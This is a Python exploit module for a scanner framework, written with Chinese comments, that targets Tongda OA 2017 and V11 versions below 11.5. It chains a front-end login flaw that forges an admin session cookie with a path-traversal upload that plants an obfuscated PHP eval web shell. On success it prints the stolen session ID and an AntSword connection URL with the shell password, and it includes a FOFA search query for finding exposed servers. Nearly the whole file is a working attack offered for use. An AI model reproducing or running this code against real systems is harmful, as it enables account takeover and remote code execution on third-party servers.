# coding:utf-8  
import requests, json
from lib.core.common import url_handle, get_random_ua, gen_title
from lib.core.poc import POCBase
# ...
import urllib3

urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
        略  
        """,  # POC描述，写更新描述，没有就不写

        "name": "通达OA2017 前台任意用户登录漏洞 ➕ 后台文件上传",  # 漏洞名称
        "VulnID": "oFx-2022-0001",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "通达OA",  # 漏洞应用名称
        "AppVersion": "通达OA 2017版  通达OA版本 V11.X < V11.5",  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
            通达OA 前台任意用户登录漏洞
            后台存在文件上传，本POC将二者结合，如果成功获取后台权限，则会尝试利用文件上传漏洞getshell，如果上传漏洞利用失败，则仍会返回后台cookie以供用户自行渗透
        """,  # 漏洞简要描述

        "fofa-dork": """
            app="TDXK-通达OA"
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        url0 = self.target + "/ispirit/login_code.php"  # url自己按需调整
        url1 = self.target + "/general/login_code_scan.php"
        url2 = self.target + "/ispirit/login_code_check.php?codeuid="
        url3 = self.target + "/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./"

        headers = {"User-Agent": get_random_ua(),
                   "Connection": "close",
                   # "Content-Type": "application/x-www-form-urlencoded",
                   }

        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.get(url0, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)

            codeUid = json.loads(req0.text)['codeuid']
            data = {'codeuid': codeUid, 'uid': int(1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'}
            req1 = requests.post(url1, data=data, headers=headers, proxies=self.proxy, timeout=self.timeout,
                                 verify=False)

            if json.loads(req1.text)["status"] == str(1):
                req2 = requests.get(url2 + codeUid, headers=headers, proxies=self.proxy, timeout=self.timeout,
                                    verify=False)
                phpsessid = req2.headers["Set-Cookie"].split(";")[0].split("=")[1]
                headers["Connection"] = "keep-alive"
                headers["Cookie"] = "PHPSESSID=" + phpsessid + ";_SERVER="
                headers["Content-Type"]="multipart/form-data; boundary=********"
                data3 = """
--********
Content-Disposition: form-data; name="FILE1"; filename="hello_tongdaoa.php"

<?php $a="~+d()"^"!{+{}";$b=${$a}["test"];eval("".$b);echo "hello tongdaoa"?>
--********"""
                req3 = requests.post(url3, data=data3, headers=headers, proxies=self.proxy, timeout=self.timeout,
                                     verify=False)
                if "error: ''," in req3.text and req3.status_code==200 and "<!DOCTYPE html>" in req3.text:
                    vuln = [True, gen_title("登录凭据：PHPSESSID: %s | 蚁剑连接URL：%s/_hello_tongdaoa.php，密码：test" % (
                    phpsessid, self.target)) + "\n" + req2.text]
                else:
                    vuln = [True, gen_title("登录凭据：PHPSESSID: " + phpsessid) + "\n" + req2.text]
            else:
                vuln = [False, req1.text]
        except Exception as e:
            raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        return self._verify()
